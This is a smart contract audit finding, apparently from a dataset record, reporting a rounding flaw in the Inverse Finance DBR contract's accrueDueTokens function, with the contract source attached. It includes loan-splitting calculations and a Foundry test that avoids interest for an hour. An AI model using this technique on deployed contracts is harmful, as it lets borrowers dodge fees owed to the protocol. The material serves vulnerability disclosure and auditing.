{
  "Title": "[M-02] Users can avoid paying fees if they manage to update their accrued fees periodically",
  "Content": "# Lines of code\n\nhttps://github.com/code-423n4/2022-10-inverse/blob/main/src/DBR.sol#L287\n\n\n# Vulnerability details\n\n## Impact\n\nWhile a user borrows DOLA, his debt position in the DBR contract accrues more debt over time. However, Solidity contracts cannot update their storage automatically over time; state updates must always be triggered by externally owned accounts. For this reason, the DBR contract cannot accurately represent a user's debt position in its storage at all times. Instead, the contract offers a method `accrueDueTokens` that, when called, updates the internal storage with the debts that accrued since the last update. This method is called before all critical financial operations that depend on an accurate value of the accumulated deficit in the contract's storage. On top, this method can also be invoked permissionless at any time. Suppose a borrower manages to call this function periodically and keep the time difference between updates short. In that case, a rounding error in the computation of the accrued debt can cause the expression to round down to zero. In this case, the user successfully avoided paying interest on his debt.\n\n## Proof of Concept\n\nFor reference, here is the affected code:\n\n~~~Solidity\n    function accrueDueTokens(address user) public {\n        uint debt = debts[user];\n        if(lastUpdated[user] == block.timestamp) return;\n        uint accrued = (block.timestamp - lastUpdated[user]) * debt / 365 days;\n        dueTokensAccrued[user] += accrued;\n        totalDueTokensAccrued += accrued;\n        lastUpdated[user] = block.timestamp;\n        emit Transfer(user, address(0), accrued);\n    }\n~~~\n\nThe problem is that the function updates the `lastUpdated[user]` storage variable even when `accrued` is `0`.\n\n### Example\n\nLet's assume that the last update occurred at `t_0`.\nFurther assume that the next update occurs at `t_1` with `t_1 - t_0 = 12s`. (`12s` is the current Ethereum block time)\nSuppose that the user's recorded `debt` position at `t_0 is `1,000,000 wei`.\nThen the accrued debt formula gives us the following:\n\n~~~\naccrued = (t_1 - t_0) * debt / 365 days\n        = 12          * 1,000,000 / 31,536,000\n        = 1,000,000 / 31,536,000\n        = 0 (because unsigned integer division rounds down)\n~~~\n\n### Maximizing profit\n\nThe accrued debt formula rounds towards zero if we have `(t_1 - t_0) * debt < 365 days`.\nThis gives us a method to compute the maximal debt that we can deposit to make the attack more efficient:\n\n~~~\ndebt_max = 365 days / 12s -1 = 2,627,999\n~~~\n\nNotice that an attacker is not limited to these small loans. He can split a massive loan into multiple small loans, capped at 2,627,999.\nTo borrow X tokens (where X is given in WEI), we can compute the number of needed loans as:\n\n~~~\n#loans = X / 2,627,999\n~~~\n\nFor example, to borrow 1 DOLA:\n\n~~~\n#loans = 10^18 / 2,627,999 = 380517648599\n~~~\n\nTo borrow 1,000,000 DOLA we would thus need 380,517,648,599,000,000 small loans.\n\n### Economical feasibility\n\nThe attack would be economically feasible if the costs of the attack were lower than the interest that accrued throughout the successful attack.\nThe dominating factor of the attack costs is the gas costs which the attacker needs to pay to update the accrued interest of the small loans every second. A clever attacker would batch as many updates into a single transaction as possible to minimize the gas overhead of the transaction. Still, at the current block time (12s), gas price (7 gwei), block gas limit (30,000,000), and current ETH price (\\$1,550.80), it's hardly imaginable that this attack is economically feasible at the moment.\n\n### Risk parameters\n\nHowever, all these values could change in the future. And if we look at other networks, Layer2 or EVM compatible Layer1, the parameters might be different today.\n\nAlso, notice that if the contract were used to borrow a different asset than DOLA, the numbers would look drastically different. The risk increases with the asset's price and becomes bigger the fewer decimals the token uses. For example, to borrow 1 WBTC (8 decimals), we would only need 39 small loans:\n\n~~~\n#loans = 10^8 / 2,627,999 ~39\n~~~\n\nAnd to borrow WBTC worth \\$1,000,000 at a price of 20,746\\$/BTC, we would need 1864 small loans.\n\n~~~\n#loans ~= 49*10^8 / 2,627,999 ~= 1864\n~~~\n\n### Foundry\n\nThe following test demonstrates how to avoid paying interest on a loan for 1h. A failing test means that the attack was successful.\n\n~~~\n$ git diff src/test/DBR.t.sol\ndiff --git a/src/test/DBR.t.sol b/src/test/DBR.t.sol\nindex 3988cf7..8779da7 100644\n--- a/src/test/DBR.t.sol\n+++ b/src/test/DBR.t.sol\n@@ -25,6 +25,20 @@ contract DBRTest is FiRMTest {\n         vm.stopPrank();\n     }\n \n+    function testFail_free_borrow() public {\n+        uint borrowAmount =  2_627_999;\n+\n+        vm.prank(address(market));\n+        dbr.onBorrow(user, borrowAmount);\n+\n+        for (uint i = 12; i <= 3600; i += 12) {\n+            vm.warp(block.timestamp + 12);\n+            dbr.accrueDueTokens(user);\n+        }\n+        assertEq(dbr.deficitOf(user), 0);\n+    }\n+\n+\n     function testOnBorrow_Reverts_When_AccrueDueTokensBringsUserDbrBelow0() public {\n         gibWeth(user, wethTestAmount);\n         gibDBR(user, wethTestAmount);\n~~~\n\nOutput:\n~~~\n$ forge test --match-test testFail_free_borrow -vv\n[⠆] Compiling...\n[⠊] Compiling 1 files with 0.8.17\n[⠢] Solc 0.8.17 finished in 2.62s\nCompiler run successful\n\nRunning 1 test for src/test/DBR.t.sol:DBRTest\n[FAIL. Reason: Assertion failed.] testFail_free_borrow() (gas: 1621543)\nTest result: FAILED. 0 passed; 1 failed; finished in 8.03ms\n\nFailing tests:\nEncountered 1 failing test in src/test/DBR.t.sol:DBRTest\n[FAIL. Reason: Assertion failed.] testFail_free_borrow() (gas: 1621543)\n\nEncountered a total of 1 failing tests, 0 tests succeeded\n~~~\n\nClassified as a high medium because the yields can get stolen/denied. It's not high risk because I don't see an economically feasible exploit.\n\n## Tools Used\n\nVSCode, Wolramapha, Foundry\n\n## Recommended Mitigation Steps\n\n* Document the risks transparently and prominently.\n* Re-evaluate the risks according to the specific network parameters of every network you want to deploy to.\n* Do not update the `lastUpdated` timestamp of the user if the computed accrued amount was zero.",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/contests/2022-10-inverse-finance-contest",
  "Code": [
    {
      "filename": "src/DBR.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\n/**\n@title Dola Borrow Rights\n@notice The DolaBorrowRights contract is a non-standard ERC20 token, that gives the right of holders to borrow DOLA at 0% interest.\n As a borrower takes on DOLA debt, their DBR balance will be exhausted at 1 DBR per 1 DOLA borrowed per year.\n*/\ncontract DolaBorrowingRights {\n\n    string public name;\n    string public symbol;\n    uint8 public constant decimals = 18;\n    uint256 public _totalSupply;\n    address public operator;\n    address public pendingOperator;\n    uint public totalDueTokensAccrued;\n    uint public replenishmentPriceBps;\n    mapping(address => uint256) public balances;\n    mapping(address => mapping(address => uint256)) public allowance;\n    uint256 internal immutable INITIAL_CHAIN_ID;\n    bytes32 internal immutable INITIAL_DOMAIN_SEPARATOR;\n    mapping(address => uint256) public nonces;\n    mapping (address => bool) public minters;\n    mapping (address => bool) public markets;\n    mapping (address => uint) public debts; // user => debt across all tracked markets\n    mapping (address => uint) public dueTokensAccrued; // user => amount of due tokens accrued\n    mapping (address => uint) public lastUpdated; // user => last update timestamp\n\n    constructor(\n        uint _replenishmentPriceBps,\n        string memory _name,\n        string memory _symbol,\n        address _operator\n    ) {\n        replenishmentPriceBps = _replenishmentPriceBps;\n        name = _name;\n        symbol = _symbol;\n        operator = _operator;\n        INITIAL_CHAIN_ID = block.chainid;\n        INITIAL_DOMAIN_SEPARATOR = computeDomainSeparator();\n    }\n\n    modifier onlyOperator {\n        require(msg.sender == operator, \"ONLY OPERATOR\");\n        _;\n    }\n    \n    /**\n    @notice Sets pending operator of the contract. Operator role must be claimed by the new oprator. Only callable by Operator.\n    @param newOperator_ The address of the newOperator\n    */\n    function setPendingOperator(address newOperator_) public onlyOperator {\n        pendingOperator = newOperator_;\n    }\n\n    /**\n    @notice Sets the replenishment price in basis points. Replenishment price denotes the increase in DOLA debt upon forced replenishments.\n     At 10000, the cost of replenishing 1 DBR is 1 DOLA in debt. Only callable by Operator.\n    @param newReplenishmentPriceBps_ The new replen\n    */\n    function setReplenishmentPriceBps(uint newReplenishmentPriceBps_) public onlyOperator {\n        require(newReplenishmentPriceBps_ > 0, \"replenishment price must be over 0\");\n        replenishmentPriceBps = newReplenishmentPriceBps_;\n    }\n    \n    /**\n    @notice claims the Operator role if set as pending operator.\n    */\n    function claimOperator() public {\n        require(msg.sender == pendingOperator, \"ONLY PENDING OPERATOR\");\n        operator = pendingOperator;\n        pendingOperator = address(0);\n        emit ChangeOperator(operator);\n    }\n\n    /**\n    @notice Add a minter to the set of addresses allowed to mint DBR tokens. Only callable by Operator.\n    @param minter_ The address of the new minter.\n    */\n    function addMinter(address minter_) public onlyOperator {\n        minters[minter_] = true;\n        emit AddMinter(minter_);\n    }\n\n    /**\n    @notice Removes a minter from the set of addresses allowe to mint DBR tokens. Only callable by Operator.\n    @param minter_ The address to be removed from the minter set.\n    */\n    function removeMinter(address minter_) public onlyOperator {\n        minters[minter_] = false;\n        emit RemoveMinter(minter_);\n    }\n    /**\n    @notice Adds a market to the set of active markets. Only callable by Operator.\n    @dev markets can be added but cannot be removed. A removed market would result in unrepayable debt for some users.\n    @param market_ The address of the new market contract to be added.\n    */\n    function addMarket(address market_) public onlyOperator {\n        markets[market_] = true;\n        emit AddMarket(market_);\n    }\n\n    /**\n    @notice Get the total supply of DBR tokens.\n    @dev The total supply is calculated as the difference between total DBR minted and total DBR accrued.\n    @return uint representing the total supply of DBR.\n    */\n    function totalSupply() public view returns (uint) {\n        if(totalDueTokensAccrued > _totalSupply) return 0;\n        return _totalSupply - totalDueTokensAccrued;\n    }\n\n    /**\n    @notice Get the DBR balance of an address. Will return 0 if the user has zero DBR or a deficit.\n    @dev The balance of a user is calculated as the difference between the user's balance and the user's accrued DBR debt + due DBR debt.\n    @param user Address of the user.\n    @return uint representing the balance of the user.\n    */\n    function balanceOf(address user) public view returns (uint) {\n        uint debt = debts[user];\n        uint accrued = (block.timestamp - lastUpdated[user]) * debt / 365 days;\n        if(dueTokensAccrued[user] + accrued > balances[user]) return 0;\n        return balances[user] - dueTokensAccrued[user] - accrued;\n    }\n\n    /**\n    @notice Get the DBR deficit of an address. Will return 0 if th user has zero DBR or more.\n    @dev The deficit of a user is calculated as the difference between the user's accrued DBR deb + due DBR debt and their balance.\n    @param user Address of the user.\n    @return uint representing the deficit of the user.\n    */\n    function deficitOf(address user) public view returns (uint) {\n        uint debt = debts[user];\n        uint accrued = (block.timestamp - lastUpdated[user]) * debt / 365 days;\n        if(dueTokensAccrued[user] + accrued < balances[user]) return 0;\n        return dueTokensAccrued[user] + accrued - balances[user];\n    }\n    \n    /**\n    @notice Get the signed DBR balance of an address.\n    @dev This function will revert if a user has a balance of more than 2^255-1 DBR\n    @param user Address of the user.\n    @return Returns a signed int of the user's balance\n    */\n    function signedBalanceOf(address user) public view returns (int) {\n        uint debt = debts[user];\n        uint accrued = (block.timestamp - lastUpdated[user]) * debt / 365 days;\n        return int(balances[user]) - int(dueTokensAccrued[user]) - int(accrued);\n    }\n\n    /**\n    @notice Approves spender to spend amount of DBR on behalf of the message sender.\n    @param spender Address of the spender to be approved\n    @param amount Amount to be approved to spend\n    @return Always returns true, will revert if not successful.\n    */\n    function approve(address spender, uint256 amount) public virtual returns (bool) {\n        allowance[msg.sender][spender] = amount;\n        emit Approval(msg.sender, spender, amount);\n        return true;\n    }\n\n    /**\n    @notice Transfers amount to address to from message sender.\n    @param to The address to transfer to\n    @param amount The amount of DBR to transfer\n    @return Always returns true, will revert if not successful.\n    */\n    function transfer(address to, uint256 amount) public virtual returns (bool) {\n        require(balanceOf(msg.sender) >= amount, \"Insufficient balance\");\n        balances[msg.sender] -= amount;\n        unchecked {\n            balances[to] += amount;\n        }\n        emit Transfer(msg.sender, to, amount);\n        return true;\n    }\n\n    /**\n    @notice Transfer amount of DBR  on behalf of address from to address to. Message sender must have a sufficient allowance from the from address.\n    @dev Allowance is reduced by the amount transferred.\n    @param from Address to transfer from.\n    @param to Address to transfer to.\n    @param amount Amount of DBR to transfer.\n    @return Always returns true, will revert if not successful.\n    */\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) public virtual returns (bool) {\n        uint256 allowed = allowance[from][msg.sender];\n        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;\n        require(balanceOf(from) >= amount, \"Insufficient balance\");\n        balances[from] -= amount;\n        unchecked {\n            balances[to] += amount;\n        }\n        emit Transfer(from, to, amount);\n        return true;\n    }\n\n    /**\n    @notice Permits an address to spend on behalf of another address via a signed message.\n    @dev Can be bundled with a transferFrom call, to reduce transaction load on users.\n    @param owner Address of the owner permitting the spending\n    @param spender Address allowed to spend on behalf of owner.\n    @param value Amount to be allowed to spend.\n    @param deadline Timestamp after which the signed message is no longer valid.\n    @param v The v param of the ECDSA signature\n    @param r The r param of the ECDSA signature\n    @param s The s param of the ECDSA signature\n    */\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) public virtual {\n        require(deadline >= block.timestamp, \"PERMIT_DEADLINE_EXPIRED\");\n        unchecked {\n            address recoveredAddress = ecrecover(\n                keccak256(\n                    abi.encodePacked(\n                        \"\\x19\\x01\",\n                        DOMAIN_SEPARATOR(),\n                        keccak256(\n                            abi.encode(\n                                keccak256(\n                                    \"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"\n                                ),\n                                owner,\n                                spender,\n                                value,\n                                nonces[owner]++,\n                                deadline\n                            )\n                        )\n                    )\n                ),\n                v,\n                r,\n                s\n            );\n            require(recoveredAddress != address(0) && recoveredAddress == owner, \"INVALID_SIGNER\");\n            allowance[recoveredAddress][spender] = value;\n        }\n        emit Approval(owner, spender, value);\n    }\n\n    /**\n    @notice Function for invalidating the nonce of a signed message.\n    */\n    function invalidateNonce() public {\n        nonces[msg.sender]++;\n    }\n\n    function DOMAIN_SEPARATOR() public view virtual returns (bytes32) {\n        return block.chainid == INITIAL_CHAIN_ID ? INITIAL_DOMAIN_SEPARATOR : computeDomainSeparator();\n    }\n\n    function computeDomainSeparator() internal view virtual returns (bytes32) {\n        return\n            keccak256(\n                abi.encode(\n                    keccak256(\"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\"),\n                    keccak256(bytes(name)),\n                    keccak256(\"1\"),\n                    block.chainid,\n                    address(this)\n                )\n            );\n    }\n\n    /**\n    @notice Accrue due DBR debt of user\n    @dev DBR debt is accrued at a rate of 1 DBR per 1 DOLA of debt per year.\n    @param user The address of the user to accrue DBR debt to.\n    */\n    function accrueDueTokens(address user) public {\n        uint debt = debts[user];\n        if(lastUpdated[user] == block.timestamp) return;\n        uint accrued = (block.timestamp - lastUpdated[user]) * debt / 365 days;\n        dueTokensAccrued[user] += accrued;\n        totalDueTokensAccrued += accrued;\n        lastUpdated[user] = block.timestamp;\n        emit Transfer(user, address(0), accrued);\n    }\n\n    /**\n    @notice Function to be called by markets when a borrow occurs.\n    @dev Accrues due tokens on behalf of the user, before increasing their debt.\n    @param user The address of the borrower\n    @param additionalDebt The additional amount of DOLA the user is borrowing\n    */\n    function onBorrow(address user, uint additionalDebt) public {\n        require(markets[msg.sender], \"Only markets can call onBorrow\");\n        accrueDueTokens(user);\n        require(deficitOf(user) == 0, \"DBR Deficit\");\n        debts[user] += additionalDebt;\n    }\n\n    /**\n    @notice Function to be called by markets when a repayment occurs.\n    @dev Accrues due tokens on behalf of the user, before reducing their debt.\n    @param user The address of the borrower having their debt repaid\n    @param repaidDebt The amount of DOLA repaid\n    */\n    function onRepay(address user, uint repaidDebt) public {\n        require(markets[msg.sender], \"Only markets can call onRepay\");\n        accrueDueTokens(user);\n        debts[user] -= repaidDebt;\n    }\n\n    /**\n    @notice Function to be called by markets when a force replenish occurs. This function can only be called if the user has a DBR deficit.\n    @dev Accrues due tokens on behalf of the user, before increasing their debt by the replenishment price and minting them new DBR.\n    @param user The user to be force replenished.\n    @param amount The amount of DBR the user will be force replenished.\n    */\n    function onForceReplenish(address user, uint amount) public {\n        require(markets[msg.sender], \"Only markets can call onForceReplenish\");\n        uint deficit = deficitOf(user);\n        require(deficit > 0, \"No deficit\");\n        require(deficit >= amount, \"Amount > deficit\");\n        uint replenishmentCost = amount * replenishmentPriceBps / 10000;\n        accrueDueTokens(user);\n        debts[user] += replenishmentCost;\n        _mint(user, amount);\n    }\n\n    /**\n    @notice Function for burning DBR from message sender, reducing supply.\n    @param amount Amount to be burned\n    */\n    function burn(uint amount) public {\n        _burn(msg.sender, amount);\n    }\n\n    /**\n    @notice Function for minting new DBR, increasing supply. Only callable by minters and the operator.\n    @param to Address to mint DBR to.\n    @param amount Amount of DBR to mint.\n    */\n    function mint(address to, uint amount) public {\n        require(minters[msg.sender] == true || msg.sender == operator, \"ONLY MINTERS OR OPERATOR\");\n        _mint(to, amount);\n    }\n\n    /**\n    @notice Internal function for minting DBR.\n    @param to Address to mint DBR to.\n    @param amount Amount of DBR to mint.\n    */\n    function _mint(address to, uint256 amount) internal virtual {\n        _totalSupply += amount;\n        unchecked {\n            balances[to] += amount;\n        }\n        emit Transfer(address(0), to, amount);\n    }\n\n    /**\n    @notice Internal function for burning DBR.\n    @param from Address to burn DBR from.\n    @param amount Amount of DBR to be burned.\n    */\n    function _burn(address from, uint256 amount) internal virtual {\n        require(balanceOf(from) >= amount, \"Insufficient balance\");\n        balances[from] -= amount;\n        unchecked {\n            _totalSupply -= amount;\n        }\n        emit Transfer(from, address(0), amount);\n    }\n\n    event Transfer(address indexed from, address indexed to, uint256 amount);\n    event Approval(address indexed owner, address indexed spender, uint256 amount);\n    event AddMinter(address indexed minter);\n    event RemoveMinter(address indexed minter);\n    event AddMarket(address indexed market);\n    event ChangeOperator(address indexed newOperator);\n}"
    }
  ]
}